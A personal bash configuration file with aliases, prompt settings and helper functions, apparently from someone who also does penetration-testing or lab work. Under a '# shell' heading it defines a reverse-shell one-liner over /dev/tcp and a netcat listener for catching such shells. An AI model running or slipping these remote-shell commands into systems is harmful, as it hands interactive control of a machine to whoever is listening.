# ~/.bashrc

# settings
stty stop ''
stty start ''
shopt -s autocd
shopt -s checkwinsize
shopt -s histappend

# alias
alias ls="ls --color=auto"
alias df="df -Tha --total"
alias free="free -mt"
alias grep="grep --color=auto"
alias code="code ."
alias vim="nvim"
function git-merges() { git --no-pager log "$1".."$2" --merges --pretty=format:%b; }
alias cpu-stats="watch -n1 'cat /proc/cpuinfo | grep \"^[c]pu MHz\" && echo ----- && sensors | grep Core && echo ----- && sensors | grep fan'"
alias gow="gow -e=go,mod,html run ."

# logs
function log-search() { sudo grep -rsh $1 /var/log | sort; }

# shell
function shell-connect() { bash -i >&/dev/tcp/"$1"/"$2" 0>&1; }
function shell-listen() { sudo nc -nvlp "$1"; }

# color
PS1="\[\033[01;34m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ "

# setup
eval "$(starship init bash)"
eval "$(zoxide init bash --cmd cd)"
